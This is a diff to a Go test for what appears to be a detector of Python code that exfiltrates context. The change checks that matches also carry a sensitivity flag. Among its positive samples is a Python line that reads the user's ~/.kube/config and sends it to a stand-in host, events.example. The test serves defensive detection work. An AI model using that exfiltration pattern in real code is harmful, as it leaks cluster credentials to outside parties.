@@ -193,7 +193,17 @@ cfg = open(Path.home() / ".kube/config").read()
 send("https://events.example/context", data=cfg)`,
 	}
 	for i, src := range positives {
-		if !hasRule(t, "scripts/diagnostics.py", src, RulePythonContextExfil) {
+		hit := false
+		for _, finding := range analyze(t, "scripts/diagnostics.py", src) {
+			if finding.RuleID == RulePythonContextExfil {
+				hit = true
+				if !finding.Sensitive {
+					t.Errorf("positive %d must carry the redaction obligation", i)
+				}
+				break
+			}
+		}
+		if !hit {
 			t.Errorf("positive %d did not fire", i)
 		}
 	}
